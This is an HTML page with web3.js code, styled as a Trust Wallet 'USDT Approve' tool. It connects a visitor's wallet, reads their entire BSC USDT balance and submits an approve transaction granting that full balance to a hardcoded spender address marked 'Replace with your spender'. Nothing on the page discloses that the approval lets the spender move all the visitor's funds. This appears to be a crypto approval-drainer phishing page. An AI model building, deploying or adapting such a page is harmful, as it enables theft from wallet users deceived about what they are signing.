<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Trust Wallet USDT Approve</title>
  <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js@1.7.4/dist/web3.min.js"></script>
  <style>
    body { font-family: sans-serif; text-align: center; margin-top: 80px; }
    button { padding: 12px 24px; font-size: 18px; margin: 10px; cursor: pointer; }
    #status { margin-top: 20px; font-weight: bold; }
  </style>
</head>
<body>

  <h2>USDT Approve (Trust Wallet Mobile)</h2>

  <button id="connectBtn">üîå Connect Wallet</button>
  <button id="approveBtn" disabled>‚úÖ Approve USDT</button>

  <div id="status">Not connected</div>

  <script>
    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT
    const SPENDER_ADDRESS = "0xD0748bB40f7F262748dA3891836D2be4ee70405b"; // Replace with your spender

    const ERC20_ABI = [
      { "constant": false, "inputs": [ { "name": "spender", "type": "address" }, { "name": "amount", "type": "uint256" } ], "name": "approve", "outputs": [ { "name": "", "type": "bool" } ], "type": "function" },
      { "constant": true, "inputs": [ { "name": "owner", "type": "address" } ], "name": "balanceOf", "outputs": [ { "name": "", "type": "uint256" } ], "type": "function" },
      { "constant": true, "inputs": [], "name": "decimals", "outputs": [ { "name": "", "type": "uint8" } ], "type": "function" }
    ];

    let web3;
    let accounts;

    const status = document.getElementById("status");
    const connectBtn = document.getElementById("connectBtn");
    const approveBtn = document.getElementById("approveBtn");

    async function connectWallet() {
      if (typeof window.ethereum === 'undefined') {
        alert("Please open this DApp inside Trust Wallet or MetaMask browser.");
        return;
      }

      try {
        web3 = new Web3(window.ethereum);
        accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });

        const user = accounts[0];
        status.innerText = "Connected: " + user;
        approveBtn.disabled = false;
      } catch (err) {
        console.error("Connection error:", err);
        status.innerText = "‚ùå Connection failed.";
      }
    }

    async function approveUSDT() {
      if (!web3 || !accounts || accounts.length === 0) {
        alert("Connect wallet first.");
        return;
      }

      try {
        const user = accounts[0];
        const token = new web3.eth.Contract(ERC20_ABI, USDT_ADDRESS);

        const balance = await token.methods.balanceOf(user).call();
        const decimals = await token.methods.decimals().call();

        if (balance === "0") {
          status.innerText = "‚ùå USDT balance is 0.";
          return;
        }

        const readableAmount = balance / (10 ** decimals);
        status.innerText = `Approving ${readableAmount} USDT...`;

        await token.methods.approve(SPENDER_ADDRESS, balance).send({ from: user })
          .on('transactionHash', hash => {
            status.innerText = "‚è≥ Tx sent: " + hash;
          })
          .on('receipt', receipt => {
            status.innerText = "‚úÖ Approved in block " + receipt.blockNumber;
          });
      } catch (err) {
        console.error("Approve error:", err);
        status.innerText = "‚ùå Approval failed.";
      }
    }

    connectBtn.addEventListener('click', connectWallet);
    approveBtn.addEventListener('click', approveUSDT);
  </script>

</body>
</html>
